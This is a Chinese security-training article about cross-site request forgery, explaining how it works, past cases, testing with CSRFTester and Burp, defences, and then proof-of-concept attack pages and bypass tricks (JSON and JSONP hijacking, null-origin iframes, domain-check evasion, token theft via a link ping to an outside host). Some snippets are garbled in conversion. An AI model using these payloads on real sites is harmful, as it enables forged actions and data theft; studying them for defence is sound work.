> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OLW1u1eEFy5-weCmkwuBcA)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

**--- 作者：掌控安全 - SSG**

一. CSRF 基础知识
------------

#### csrf 漏洞简介

CSRF（Cross-site request forgery）跨站请求伪造：**攻击者诱导受害者进入第三方网站**，

**在第三方网站中，向被攻击网站发送跨站请求**。

利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的

#### csrf 与 xss 区别

XSS：跨站脚本（Cross-site scripting，通常简称为 XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。

**它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。**

这类攻击通常包含了 HTML 以及客户端脚本语言（最常见如：JavaScript）

**XSS 更偏向于方法论**，CSRF 更偏向于一种形式，只要是伪造用户发起的请求，都可成为 CSRF 攻击。

**通常来说 CSRF 是由 XSS 实现的**

所以 CSRF 时常也被称为 XSRF[用 XSS 的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求 [只要通过合法验证即可]）。

**XSS 更偏向于代码实现（**即写一段拥有跨站请求功能的 JavaScript 脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了 XSS 攻击了**）**

**CSRF 更偏向于一个攻击结果**，只要发起了冒牌请求那么就算是 CSRF 了

#### csrf 漏洞原理

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcovfYXl86Kbd8icbbIGC4epeic8FcTicc5mL5uhX1ibBRvFNjAV7lViaIRUGSsqHnCXNpEsFSApoU2tAHw/640?wx_fmt=png)

上图中网站 A 为存在 CSRF 漏洞的网站，网站 B 为攻击者构建的恶意网站，User 为网站 A 网站的合法用户。

CSRF 攻击攻击原理及过程如下：

```
1.用户user打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。
```

二. CSRF 分类
----------

#### Get 型

这种类型的 CSRF 一般是**由于程序员安全意识不强造成的**。

GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，所以，一般会这样利用：

`<img src=http://example.cn/csrf.php?xx=11 />`

在访问含有这个 img 的页面后，浏览器会自动向`http://example.cn/csrf.php?xx=11`发出一次 HTTP 请求。

example.cn 就会收到包含受害者登录信息的一次跨域请求。

所以，如果将该网址替换为存在 GET 型 CSRF 的地址，就能完成攻击了。

#### Post 型

这种类型的 CSRF 危害没有 GET 型的大，利用起来通常使用的是一个自动提交的表单，如：

```
<formaction=http://example.cn/csrf.phpmethod=POST>
<inputtype="text"/>
</form>
<script> document.forms[0].submit();</script>
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。

POST 类型的攻击通常比 GET 要求更加严格一点，但仍并不复杂。

任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。

#### 链接类型

链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。

这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：

```
<ahref=" http://example.cn/csrf.php?xx=11"taget="_hacker">
      百万福利，点击就送！！
<a/>
```

由于之前用户登录了信任的网站 A，并且保存登录状态，只要用户主动访问上面的这个 PHP 页面，则表示攻击成功。

三. CSRF 特点以及危害
--------------

#### csrf 特点

1、攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。

2、攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。整个过程攻击者并不能获取到受害者的登录凭证，仅仅是 “冒用”。

3、跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等。

部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。

4、CSRF 通常是跨域的，因为外域通常更容易被攻击者掌控。

但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。

#### csrf 危害

CSRF 攻击会根据场景的不同而危害迥异，比较常见的有：

```
发送邮件
修改账户信息
资金转账
盗取用户隐私数据
网站被上传网马
作为其他攻击方式的辅助攻击（比如xss）
传播CSRF蠕虫（见下文中的YouTube CSRF漏洞）
等等
```

四. CSRF 实例
----------

#### WordPress 的 CSRF 漏洞

2012 年 3 月份，WordPress 发现了一个 CSRF 漏洞，影响了 WordPress 3.3.1 版本，

WordPress 是众所周知的博客平台，该漏洞可以允许攻击者修改某个 Post 的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。

那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，

然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，

其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的代码如下：

```
<html> 
<bodyonload="javascript:document.forms[0].submit()"> 
<H2>CSRF Exploit to add Administrator</H2> 
    <form method="POST" >
<inputtype="hidden"/> 
        <input type="hidden" />
<inputtype="hidden"/> 
<inputtype="hidden"/> 
<inputtype="hidden"admin2@admin.com"/> 
<inputtype="hidden"admin2@admin.com"/> 
<inputtype="hidden"/> 
<inputtype="hidden"/> 
<inputtype="hidden"/> 
<inputtype="hidden"/> 
<inputtype="hidden"/> 
<inputtype="hidden"/> 
</form> 
</body> 
</html>
```

#### 新浪微博 CSRF 点链接关注

新浪微博 2015 年出现的 csrf 漏洞可以不经过用户同意点击链接获得关注，漏洞产生在点击分享榜单的时候，会先发送一个请求关注 “微博电影板”，不需要经过用户同意。

这个接口了防范 CSRF，但是是通过判断 referer 来实现的，因此可以被绕过。

只要是以 movie.weibo.com. 开头的任意子域名都可以绕过。

页面内容：

```
<formaction="http://movie.weibo.com/movie/web/follow"method="post"> 
<inputtype="text"/> 
<script> document.forms[0].submit();</script> 
</form>
```

#### YouTube 的 CSRF 漏洞

2008 年，有安全研究人员发现，YouTube 上几乎所有用户可以操作的动作都存在 CSRF 漏洞。

如果攻击者已经将视频添加到用户的 “Favorites”

那么他就能将他自己添加到用户的 “Friend” 或者 “Family” 列表，

以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。

例如，要把视频添加到用户的 “Favorites”，攻击者只需在任何站点上嵌入如下所示的 IMG 标签：

```
<imgsrc="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&video_
id=[VIDEO ID]&playlist_id=&add_to_favorite=1&show=1&button=AddvideoasFavorite"/>
```

攻击者也许已经利用了该漏洞来提高视频的流行度。

例如，将一个视频添加到足够多用户的 “Favorites”，YouTube 就会把该视频作为“Top Favorites” 来显示。

除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为 “不宜的”，从而导致 YouTube 删除该视频。

**这些攻击还可能已被用于侵犯用户隐私。**

YouTube 允许用户只让朋友或亲属观看某些视频。

这些攻击会导致攻击者将其添加为一个用户的 “Friend” 或“Family”列表，

这样他们就能够访问所有原本只限于好友和亲属表中的用户观看的私人的视频。

攻击者还可以通过用户的所有联系人名单（“Friends”、“Family” 等等）来共享一个视频，“共享” 就意味着发送一个视频的链接给他们，当然还可以选择附加消息。

这条消息中的链接已经并不是真正意义上的视频链接，

而是一个具有攻击性的网站链接，用户很有可能会点击这个链接，

这便使得该种攻击能够进行病毒式的传播。

五. CSRF 探测
----------

#### CSRFTester-1.0

CSRFTester 是一款 CSRF 漏洞的测试工具，和 burp suite 一样，需要安装 java 环境。

他的工作原理是，使用代理抓取我们在浏览器中访问过的所有的链接及表单信息，

通过 CSRFTester 修改相应表单信息，重新提交，相当于伪造了一次客户端请求，

如果测试的请求成功，被服务器接受，则证明存在 CSRF 漏洞

**1、设置浏览器代理**

CSRFTester 默认使用 Localhost 上的端口 8008 作为其代理（双击 dist 中的 bat 文件即可运行），

如果代理配置成功，CSRFTester 将为您的浏览器生成的所有后续 HTTP 请求生成调试消息。

**2、使用合法账户访问网站开始测试**

我们需要找到一个我们想要为 CSRF 测试的特定业务 Web 页面。

找到此页面后，选择 CSRFTester 中的 “start recoding” 按钮并执行业务功能；

完成后，点击 CSRFTester 中的 “stop recoding” 按钮；

正常情况下，该软件会全部遍历一遍当前页面的所有请求。

**3、通过 CSRF 修改并伪造请求**

之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有 GET 或者 POST 请求。

通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改 query 和 form 的参数。

当修改完所有我们希望诱导用户 form 最终的提交值，可以选择开始生成 HTML 报告。

#### Burp 测试 csrf

Burp 验证 csrf 的原理和 CSRFTester 类似，同样是通过抓取数据包，修改相应表单信息，重新提交，伪造客户端请求，请求成功则说明存在 csrf 漏洞

1、 配置浏览器代理。Burp 的默认代理是 127.0.0.1:8080

2、 抓取有可能存在 csrf 的页面，右击选中的链接，选择 Engagement tools—->Generate CSRF POC 选项

3、 在弹出的 CSRF Poc generater 页面，点击”Test in browser—>Copy”，复制生成的 URL，打开刚才访问过目标网站的浏览器（注意不能关闭原来登录网站的页面，此时也不能关闭代理），新建一个页面，粘贴刚才复制的 URL，访问.

4、 这是一个 HTML 表单，功能是在点击”Submit request” 按钮后，将表单数据提交至目标地址，也就是提交至可信任服务器。

若可信任服务器正常响应这个请求，说明漏洞利用成功。

六. CSRF 防御
----------

#### 同源检测

##### 使用 Origin Header 确定来源域名

在部分与 CSRF 有关的请求中，请求的 Header 中会携带 Origin 字段。字段内包含请求的域名（不包含 path 及 query）。

如果 Origin 存在，那么直接使用 Origin 中的字段确认来源域名就可以（302 重定向的请求中不存在）

##### 使用 Referer Header 确定来源域名

根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的来源地址。

对于 Ajax 请求，图片和 script 等资源请求，Referer 为发起请求的页面地址。

对于页面跳转，Referer 为打开页面历史记录的前一个页面地址。

因此我们使用 Referer 中链接的 Origin 部分可以得知请求的来源域名。

**这种方法并非万无一失**，Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。

使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。

在部分情况下，**攻击者可以隐藏，甚至修改自己请求的 Referer。**

**无法确定来源域名的情况，大多情况可以选择直接阻止。**

总的来说，**同源验证是一个相对简单的防范方法，能够防范绝大多数的 CSRF 攻击。**

但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。

#### CSRF Token

CSRF 的一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用 Cookie 中的信息。

而 CSRF 攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。

那么我们可以要求所有的用户请求都携带一个 CSRF 攻击者无法获取到的 Token。

服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开，也可以防范 CSRF 的攻击。

Token 是一个比较有效的 CSRF 防护方法，只要页面没有 XSS 漏洞泄露 Token，那么接口的 CSRF 攻击就无法成功。

但是此方法的实现比较复杂，需要给每一个页面都写入 Token（前端无法使用纯静态页面），每一个 Form 及 Ajax 请求都携带这个 Token，后端对每一个接口都进行校验，并保证页面 Token 及请求 Token 一致。

这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。

**这种方法工作量巨大，且有可能遗漏**

验证码和密码其实也可以起到 CSRF Token 的作用哦，而且更安全

#### 双重 Cookie 验证

在会话中存储 CSRF Token 比较繁琐，而且不能在通用的拦截上统一处理所有的接口。

那么另一种防御措施是使用双重提交 Cookie。

利用 CSRF 攻击不能获取到用户 Cookie 的特点，我们可以要求 Ajax 和表单请求携带一个 Cookie 中的值。

双重 Cookie 采用以下流程：

在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如`csrfcookie=v8g9e4ksfhw`）。

在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中（例如 `https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）`。

后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝。

此方法相对于 CSRF Token 就简单了许多。可以直接通过前后端拦截的的方法自动化实现。

后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储 Token。

但是却没有大规模应用，因为它在大型网站上的安全性还是没有 CSRF Token 高，

这个是由于任何跨域都会导致前端无法获取 Cookie 中的字段（包括子域名之间），而且如果有其他漏洞（例如 XSS），攻击者可以注入 Cookie，那么该防御方式失效。

七. CSRF 利用 POC
--------------

#### fetch

fetch 是一种 HTTP 数据请求的方式，是 XMLHttpRequest 的一种替代方案。

  
假如遇到 POST 为 JSON 格式的 CSRF，并且验证了 Content-Type 是否是 application / json，通过使用 fetch 能构造出 JSON 请求，并且能设置 Content-Type，达到 json 劫持的目的。缺点无法跨域。

获取发起者的请求代码：

```
<html>
<title>JSON CSRF POC</title>
<script>
        fetch('http://target.com/vul.page',{method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:'{"name":"attacker","email":"attacker.com"}'});
</script>
</html>
```

#### ajax

Ajax 是一种异步请求数据的 web 开发技术，经常被用来在不刷新页面的情况下，提交和请求数据。

请求 poc:

```
<html>
<title> Ajax CSRF POC</title>
<script>
    $.ajax({
       url:"http://target.com/vul.page",
  type:"POST",
  headers:{"X-CSRFtoken":$.cookie("csrftoken")}，
  data:'{"name":"attacker","email":"attacker.com"}',
  success:functon(res){},
  error:function(err){}
});
</script>
</html>
```

#### jQuery

jQuery 其实就是封装了 js 的一些库 而它发起 http 请求的方式就是 ajax，因此写法参照上文

#### jsonp

Jsonp(JSON with Padding) 是 json 的一种” 使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。

JSONP 的语法和 JSON 很像，简单来说就是在 JSON 外部用一个函数包裹着。JSONP 基本语法如下：

`callback({ "name": "kwan" , "msg": "获取成功" });`

JSONP 原理就是动态插入带有跨域 url 的 <script> 标签，然后调用回调函数，把我们需要的 json 数据作为参数传入，通过一些逻辑把数据显示在页面上。

常见的 jsonp 形式类似：`http://www.test.com/index.html?jsonpcallback=hehe`

传过去的 hehe 就是函数名，服务端返回的是一个函数调用，可以理解为：evil 就是一个函数，([“customername1”,”customername2”]) 就是函数参数，网站前端只需要再编写代码处理函数返回的值即可。

jsonp 劫持属于 CSRF 攻击，当某网站通过 JSONP 的方式来跨域传递用户认证后的敏感信息时

攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者点击访问来截取用户敏感信息，一个典型的 JSON HiJacking 攻击代码：

```
# www.hacker.com/hacker.html
<script>
function hehe(v){
    alert(v.username);
}
</script>
<script src="http://abc.com/?m=info&func=hehe"></script>
```

当用户在已经登录 abc 网站的情况下访问如上 `www.hacker.com/hack` 网页，那么用户的隐私数据就可能被攻击者劫持。

JSONP 绕过 token 防护进行 csrf 攻击

假设有个场景是这样：

服务端判断接收到的请求包，如果含有 htmlcallback 参数就返回 JSONP 格式的数据，否则返回正常页面。

代码如下：

```
<!-- callback.php -->
<?php
    header('Content-type: application/json');
//json数据
    $json_data ='{"customername1":"user1","password":"12345678"}';
if(isset($_GET["htmlcallback"])){
        $callback = $_GET["htmlcallback"];
//如果含有htmlcallback参数，输出jsonp格式的数据
        echo $htmlcallback ."(". $json_data .")";
}else{
        echo $json_data;
}
?>
```

对于场景，如果存在 JSONP 劫持劫持，我们就可以获取到页面中的内容，提取出 csrf_token，然后提交表单，造成 csrf 漏洞。

示例利用代码如下：

```
<html>
<head>
<title>test</title>
<metacharset="utf-8">
</head>
<body>
<divid="test"></div>
<scripttype="text/javascript">
function test(obj){
// 获取对象中的属性值
var content = obj['html']
// 正则匹配出参数值
var token=content.match('token = "(.*?)"')[1];
// 添加表单节点
var parent=document.getElementById("test");
var child=document.createElement("form");
    child.method="POST";
    child.action="http://vuln.com/del.html";
    child.id="test1"
    parent.appendChild(child);
var parent_1=document.getElementById("test1");
var child_1=document.createElement("input");
    child_1.type="hidden";child_1.;child_1.value=token;
var child_2=document.createElement("input");
    child_2.type="submit";
    parent_1.appendChild(child_1);
    parent_1.appendChild(child_2);
}
</script>
<scripttype="text/javascript"src="http://vuln.com/caozuo.html?htmlcallback=test"></script>
</body>
</html>
```

htmlcallback 返回一个对象 obj，以该对象作为参数传入 test 函数，操作对象中属性名为 html 的值，正则匹配出 token，再加入表单，自动提交表单完成操作，用户点击该攻击页面即收到 csrf 攻击。

不过通过这个方法绕过 token 存在几个限制：

1、存在 jsonp 劫持

2、能在源码中找到 token 

3、没有 referer 防护

八. CSRF 绕过
----------

### 绕过 Origin、Referer

#### Null 值绕过

当遇到一个 cors 可用 null 值绕过时，用 iframe 配合 data 协议，就可以发送一个 origin 为 null 的请求。这个绕过方式同样也可以用在 CSRF 这里。

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html, <script>var req=newXMLHttpRequest();req.onload=reqListener;req.open("get","http://127.0.0.1/test.html",true);req.withCredentials=true;req.send();function reqListener(){alert(this.responseText)};</script>'>
</iframe>
```

#### 域名校验绕过

当域名校验不是特别严格时，可以通过以下几种方式进行绕过：

在后面加域名 `qq.com => qq.com.abc.com`

将域名拼接 `abc.qq.com => abc_qq.com`

在前面或者在后面加字符 `qq.com => abcqq.com / qq.com => qq.comabc.com / qq.com => abc.com/qq.com`

#### 配合 XSS 进行利用

当同源网站中存在一个 xss 漏洞时，就可以直接使用 xss 包含 CSRF 的 payload 进行利用。

不仅可以绕过简单的 Referer 和 Origin 验证，还可以劫持表单与 URL 中的 token 进行利用

获取表单中的 token

当 token 存在于表单中时，可以配合 XSS 漏洞进行表单劫持进而让 token 的限制。

xss 劫持页面中某个表单的提交

像这个就可以劫持 user-edit，即用户提交的表单，点击即可重新提交 form 表单，以此获取用户提交的表单数据。

```
<inputtype="submit"form="user-edit"value="提交">
```

就相当于劫持了 user-edit 表单然后进行提交

xss 劫持页面表单并修改 value

```
<inputtype="text"form="user-edit"value="This is a test">
<inputtype="submit"form="user-edit"value="提交">
```

这个是劫持 user-edit 表单，并且覆盖各表单的 value，结合 CSRF 利用。

获取 url 参数中的 token

```
<ahref="https://hack.com">get_token</a>
<ahref="https://target.com/"ping="https://hack.com ">trackping</a>
```

#### 配合 URL 跳转漏洞

如果是 GET 形式的 CSRF，配合 URL 跳转漏洞，即可绕过 Origin 和 Referer 的限制。

### 绕过 X-Request-with（X-Request-with 用于区分 ajax 请求还是普通请求）

#### Token Bypass

删除 Token 参数字段

将 Token 参数值置空

这种方法适用于 token 本身存在漏洞。

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**